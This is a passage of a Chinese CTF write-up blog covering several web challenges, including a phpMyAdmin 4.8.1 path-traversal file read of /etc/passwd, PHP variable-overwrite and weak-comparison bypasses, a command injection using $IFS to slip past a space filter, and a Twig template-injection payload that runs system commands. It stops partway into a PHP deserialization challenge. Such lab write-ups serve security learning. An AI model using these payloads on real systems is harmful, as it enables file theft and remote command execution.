<h3 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/fc4bfa32f44415f4ef71bc8fa0ac19d6.png"></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV+LmMK#rd">ã€é¦–å‘ã€‘phpmyadmin4.8.1åå°getshell</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/18c2813b1aa6a47d71a1113fd183c5c9.png"></p>
<p><del>è¿™ç‰ˆæœ¬å·å¾ˆéš¾ä¸æ€€ç–‘æ˜¯å…ˆå°„ç®­åç”»é¶ï¼ˆ</del></p>
<pre class="line-numbers language-none"><code class="language-none">?target=db_sql.php%253f/../../../../../../etc/passwd #å‘ç°å¯
?target=db_sql.php%253f/../../../../../../flag
flag{23e69c98-808e-4a00-9cdb-a5caff9299f6}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><p>è¯´å®è¯ï¼Œæœ‰ç‚¹ç‚«é…·ï¼ˆ</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/892f0ddbef34f3312a4405fbb403b39b.png"></p>
<p>åˆæ˜¯git</p>
<p>å˜¶ï¼Œä½†æ˜¯index.phpæœ‰ç‚¹æŸåï¼Œäºæ˜¯ä»githubä¸Šæ‹¿äº†</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php

<span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>

<span class="token variable">$yds</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"dog"</span><span class="token punctuation">;</span>
<span class="token variable">$is</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"cat"</span><span class="token punctuation">;</span>
<span class="token variable">$handsome</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yds'</span><span class="token punctuation">;</span>
<span class="token comment"># éå†é€šè¿‡ POST æ–¹æ³•ä¼ é€’è¿‡æ¥çš„æ‰€æœ‰å‚æ•°</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=&gt;</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment"># åŠ¨æ€åˆ›å»ºæˆ–ä¿®æ”¹å˜é‡ï¼Œå°† POST å‚æ•°çš„é”®ä½œä¸ºå˜é‡åï¼Œå€¼ä½œä¸ºå˜é‡ã€€ã€€ã€€</span>
    <span class="token variable">$$x</span> <span class="token operator">=</span> <span class="token variable">$y</span>  <span class="token punctuation">;</span> <span class="token comment">#x=y=&gt;$x=y</span>
<span class="token punctuation">}</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=&gt;</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ã€€ã€€ã€€ 
    <span class="token variable">$$x</span> <span class="token operator">=</span> <span class="token variable">$$y</span><span class="token punctuation">;</span> <span class="token comment">#?x=y=&gt;$x=$y</span>
<span class="token punctuation">}</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=&gt;</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$x</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$x</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">#$flag=$x;$x!='flag'</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$handsome</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">#å­˜åœ¨$flagä¸”ä¸€ä¸ªå³å¯</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$yds</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span>  <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$is</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"the flag is: "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>exit($flag)</code> å°±æ˜¯å°†å˜é‡ <code>$flag</code> çš„å€¼ä½œä¸ºå‚æ•°ä¼ é€’ç»™ <code>exit</code>ã€‚</p>
<p>(1) exit($handsome):</p>
<p>$xä¸$flagå€¼ç›¸åŒä½†$xä¸æ˜¯$flag,å³è¦ä¿è¯ <code>$_GET['flag']</code> çš„å€¼ç­‰äºæŸä¸ªé™¤ <code>'flag'</code> ä¹‹å¤–çš„ GET å‚æ•°çš„é”®åï¼Œåªè¦$flag=$num1&amp;$num1=$anythingã€‚è€Œä¸”å¿…é¡»æœ‰ä¸€ä¸ªæ˜¯$x=$handsome,$y=flagä»¥è¦†ç›–â€™ydsâ€™ï¼ˆ?handsome=flag)ã€‚</p>
<p>so,<code>?handsome=flag&amp;flag=qing&amp;qing=qihai</code></p>
<p>(2) exit($yds):</p>
<p>$yds=$flagå³å¯ã€‚<code>?yds=flag</code></p>
<p>(3) exit($is):</p>
<p>?is=flagè€Œä¸”ç›´æ¥$flag=$flag.<code>?is=flag&amp;flag=flag</code></p>
<p>(4)echo :</p>
<p><code>get</code> ä¼ å‚æ•°çš„æ—¶å€™ï¼Œå¦‚æœä¼ å…¥<code>1</code>ï¼Œé»˜è®¤:åšä¸ºé”®:ç±»å‹æ˜¯ <code>int</code>; åšä¸ºå€¼ï¼Œç±»å‹æ˜¯ <code>string</code></p>
<p><code>$_GET['flag'] === $x</code> : å¦‚æœä¼ å…¥ <code>a=flag&amp;flag=anything</code> é‚£ä¹ˆ åˆ¤æ–­ <code>a=flag</code> çš„æ—¶å€™ <code>$_GET['flag']</code> æ˜¯ <code>a</code>, <code>&amp;x</code> æ˜¯ <code>a</code>ï¼Œå®Œå…¨ç›¸ç­‰ è¿›å…¥ifæ¡ä»¶, è€Œå¦‚æœä¼ å…¥ <code>1=flag&amp;flag=1</code> é‚£ä¹ˆåˆ¤æ–­ <code>1=flag</code>çš„æ—¶å€™ <code>$_GET['flag']</code> æ˜¯ <code>(string)1</code> ï¼Œ<code>&amp;x</code> æ˜¯ <code>(int)1</code> ä¸å®Œå…¨ç›¸ç­‰ï¼Œæ— æ³•è¿›å…¥ifæ¡ä»¶ï¼Œè¿›è€Œç»•è¿‡ã€‚</p>
<p><code>?1=flag&amp;flag=1</code></p>
<hr>
<h3 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h3><blockquote>
<p>è¿™ä¸ªé”™è¯¯ä¿¡æ¯ <code>Cannot modify header information - headers already sent by (output started at /var/www/html/index.php:3) in /var/www/html/index.php on line 4</code> æ˜¯ PHP ä¸­ä¸€ä¸ªå¸¸è§çš„é”™è¯¯ï¼Œå®ƒè¡¨æ˜ä½ åœ¨å°è¯•ä¿®æ”¹ HTTP å“åº”å¤´æ—¶ï¼Œå“åº”å¤´å·²ç»è¢«å‘é€å‡ºå»äº†ã€‚</p>
<p>åœ¨ PHP é‡Œï¼ŒHTTP å“åº”å¤´å¿…é¡»åœ¨ä»»ä½•å®é™…çš„è¾“å‡ºï¼ˆåƒ HTML å†…å®¹ã€ç©ºæ ¼ã€æ¢è¡Œç¬¦ç­‰ï¼‰ä¹‹å‰å‘é€ã€‚ä¸€æ—¦æœ‰è¾“å‡ºäº§ç”Ÿï¼ŒPHP å°±ä¼šè‡ªåŠ¨æŠŠå“åº”å¤´å‘é€ç»™å®¢æˆ·ç«¯ï¼Œä¹‹åå†å°è¯•ä¿®æ”¹å“åº”å¤´å°±ä¼šè§¦å‘è¿™ä¸ªé”™è¯¯ã€‚</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/951c27a59a316c07b87d61cf4e91c280.png"></p>
<p>çœ‹ç€å¥½åƒrobot(</p>
<p><del>å“ˆå“ˆæœç„¶æœ‰ï¼ŒèµŒç‹—å¤§èƒœåˆ©ï¼ˆ</del></p>
<p><del>å•Šå•Šå•Šç«Ÿç„¶æ˜¯å‡çš„ï¼ŒèµŒç‹—å¤§å¤±è´¥</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/dc253305a2a22325b0b8957420b71c6d.png"></p>
<p>ï¼ï¼ï¼åˆç«™èµ·æ¥äº†</p>
<p>ğŸ˜°ä»€ä¹ˆ__å›¾ï¼Œå“ˆäºº(å°¤å…¶æ˜¯æˆ‘çš„è¿˜ä¹±ç ï¼Œè®©æˆ‘å®‰äº†ä¸ªæ‰©å±•ä¿®äº†ä¸€é)</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt; img src="/img.jpg"&gt;
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token comment">//level 1</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2020</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">2021</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token comment">#intval å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å»éæ´²å§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//level 2</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
       <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;"</span><span class="token punctuation">;</span>
   <span class="token keyword">else</span>
       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å»éæ´²å§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//get flag</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">#éœ€ä¸åŒ…å«ç©ºæ ¼</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"wctf2020"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#è¿‡æ»¤cat</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;"</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å¿«åˆ°éæ´²äº†"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å»éæ´²å§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
å»éæ´²å§<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆæˆ‘åœ¨Bç«™/æŠ–ä¸Šç»å¸¸çœ‹è¿™upçš„è§†é¢‘ï¼ˆ</p>
<blockquote>
<p>intval ( mixed $var [, int $base = 10 ] ) : int<br>$varï¼šè¦è½¬æ¢ä¸ºæ•´æ•°çš„å˜é‡ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æµ®ç‚¹æ•°ç­‰ã€‚<br>$baseï¼šè½¬æ¢æ‰€ä½¿ç”¨çš„è¿›åˆ¶ï¼Œé»˜è®¤ä¸ºåè¿›åˆ¶ï¼ˆ10ï¼‰ã€‚</p>
<p><code>intval</code> å‡½æ•°åœ¨å¤„ç†å­—ç¬¦ä¸²æ—¶ï¼Œä¼šä»å­—ç¬¦ä¸²å¼€å¤´æå–æœ‰æ•ˆçš„æ•°å­—éƒ¨åˆ†ï¼Œç›´åˆ°é‡åˆ°éæ•°å­—å­—ç¬¦ä¸ºæ­¢ã€‚</p>
</blockquote>
<ol>
<li><strong><code>$num</code> çš„å€¼</strong>ï¼šæˆ‘ä»¬å°† <code>$num</code> èµ‹å€¼ä¸º <code>"2019e10"</code>ã€‚åœ¨ç§‘å­¦è®¡æ•°æ³•ä¸­ï¼Œ<code>2019e10</code> è¡¨ç¤º <code>2019 * 10^10</code>ã€‚</li>
<li><strong><code>intval($num)</code> çš„è®¡ç®—</strong>ï¼šå½“å¯¹ <code>"2019e10"</code> è°ƒç”¨ <code>intval</code> å‡½æ•°æ—¶ï¼Œå®ƒä¼šä»å­—ç¬¦ä¸²å¼€å¤´æå–æ•°å­—éƒ¨åˆ†ï¼Œå³åªå–åˆ° <code>"2019"</code>ï¼Œæ‰€ä»¥ <code>intval($num)</code> çš„ç»“æœæ˜¯ 2019ï¼Œæ»¡è¶³ <code>intval($num) &lt; 2020</code>ã€‚</li>
<li><strong><code>intval($num + 1)</code> çš„è®¡ç®—</strong>ï¼šåœ¨ PHP ä¸­ï¼Œå½“ä¸€ä¸ªå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ•´æ•°è¿›è¡ŒåŠ æ³•è¿ç®—æ—¶ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²å°è¯•è½¬æ¢ä¸ºæ•°å­—ã€‚<code>"2019e10"</code> ä¼šè¢«è½¬æ¢ä¸ºç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºçš„æ•°å€¼ï¼Œå³ <code>2019 * 10^10</code>ï¼Œç„¶ååŠ  1 åå†è°ƒç”¨ <code>intval</code> å‡½æ•°ï¼Œç”±äºè¿™ä¸ªæ•°å€¼è¿œè¿œå¤§äº 2021ï¼Œæ‰€ä»¥ <code>intval($num + 1) &gt; 2021</code> æˆç«‹ã€‚</li>
<li><strong>è¡¨è¾¾å¼ç»“æœ</strong>ï¼šç”±äºä¸¤ä¸ªæ¡ä»¶éƒ½æ»¡è¶³ï¼Œæ‰€ä»¥æ•´ä¸ªè¡¨è¾¾å¼ <code>intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021</code> çš„ç»“æœä¸º <code>true</code>ã€‚</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dre0m1/p/16062369.html">PHPä¸­MD5å’Œsha1ç»•è¿‡æ–¹å¼æ€»ç»“ - dre0m1 - åšå®¢å›­</a></p>
<p><code>0e215962017</code> çš„ MD5 å€¼ä¹Ÿæ˜¯ç”± <strong>0e</strong> å¼€å¤´ï¼Œåœ¨ PHP å¼±ç±»å‹æ¯”è¾ƒä¸­ç›¸ç­‰</p>
<blockquote>
<p><code>strstr</code> å‡½æ•°ç”¨äºæŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¹¶è¿”å›ä»è¯¥ä½ç½®åˆ°å­—ç¬¦ä¸²æœ«å°¾çš„éƒ¨åˆ†ã€‚å¦‚æœæœªæ‰¾åˆ°ï¼Œåˆ™è¿”å› <code>false</code>ã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token keyword type-hint">mixed</span> <span class="token variable">$search</span><span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$subject</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$count</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><code>$search</code>ï¼šè¦æŸ¥æ‰¾å¹¶æ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–æ•°ç»„ã€‚</li>
<li><code>$replace</code>ï¼šç”¨äºæ›¿æ¢ <code>$search</code> çš„å­—ç¬¦ä¸²æˆ–æ•°ç»„ã€‚</li>
<li><code>$subject</code>ï¼šè¦åœ¨å…¶ä¸­è¿›è¡Œæ›¿æ¢æ“ä½œçš„å­—ç¬¦ä¸²æˆ–æ•°ç»„ã€‚</li>
<li><code>$count</code>ï¼šå¯é€‰å‚æ•°ï¼Œç”¨äºè®°å½•æ›¿æ¢å‘ç”Ÿçš„æ¬¡æ•°ã€‚</li>
</ul>
</blockquote>
<p><code>ls</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0eb6cd922ba7eee36797439d7ecdbb3d.png"></p>
<p><del>å“æ­»äº†ç¬¬ä¸€çœ¼è¿˜ä»¥ä¸ºflagæ˜¯ä¸ªå›¾ç‰‡</del></p>
<pre class="line-numbers language-none"><code class="language-none">?num=2019e10&amp;md5=0e215962017&amp;get_flag=tail$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
flag{792fd7de-6906-4c7c-8fab-a153c66377d3}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<hr>
<h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>â€‹	<!-- Why not take a closer look at cookies? --></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2130787">ä¸€æ–‡äº†è§£SSTIå’Œæ‰€æœ‰å¸¸è§payload ä»¥flaskæ¨¡æ¿ä¸ºä¾‹-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a></p>
<p><img src="C:/Users/16256/AppData/Roaming/Typora/typora-user-images/image-20250218130008075.png" alt="image-20250218130008075"></p>
<p>å¦ï¼š<code>{{7*'7'}}</code>åœ¨Twigä¸­è¿”å›<code>49</code>ï¼Œåœ¨Jinja2ä¸­è¿”å›<code>77777777</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8fd1c993d8b96fabcaa7767f11ff1745.png"></p>
<ul>
<li></li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/fe001932fec08dee373fa155f9db9668.png"></p>
<p>æ„æ€æ˜¯è¿™ä¸ªBJDCTFè€ƒäº†ä¸¤éTwigï¼Œ<del>what can I say(</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2311f4524bead78403c2d186c4d84c36.png"></p>
<p>xaxaxa</p>
<pre class="line-numbers language-none"><code class="language-none">{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("ls /")}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8e7ad35e42e2f858784f923c139bf41c.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/afd1a322d76d2ad1ed3f2d3006f2d31b.png"></p>
<hr>
<h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000007250604">PHPä¹‹åå…­ä¸ªé­”æœ¯æ–¹æ³•è¯¦è§£ - The code - SegmentFault æ€å¦ç½‘</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php
<span class="token comment">//flag is in flag.php</span>
<span class="token comment">//WTF IS THIS?</span>
<span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span>
<span class="token comment">//And Crack It!</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">{</span>
    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç›®æ ‡</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//__invokeæ–¹æ³•ä¼šåœ¨å¯¹è±¡è¢«å½“ä½œå‡½æ•°è°ƒç”¨æ—¶è§¦å‘</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

